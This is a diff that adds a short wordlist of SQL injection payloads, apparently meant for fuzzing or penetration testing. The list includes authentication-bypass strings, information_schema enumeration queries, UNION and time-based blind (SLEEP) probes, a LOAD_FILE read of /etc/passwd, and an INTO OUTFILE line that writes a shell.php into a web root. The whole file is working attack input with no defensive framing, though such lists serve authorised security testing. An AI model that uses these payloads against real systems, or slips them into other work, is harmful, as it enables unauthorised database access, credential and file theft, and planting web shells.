@@ -1,0 +1,21 @@
+'
+"
+'--
+' #
+SELECT @@VERSION, USER(), DATABASE();
+SELECT table_name FROM information_schema.tables;
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
+SELECT 'malicious code' INTO OUTFILE '/var/www/html/shell.php';
+SELECT LOAD_FILE('/etc/passwd');
+SELECT CONCAT('a', 'b');
+' OR 1=1--
+' OR 1=1#
+" OR 1=1--
+" OR 1=1#
+admin'--
+admin' #
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+SLEEP(5)
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)='
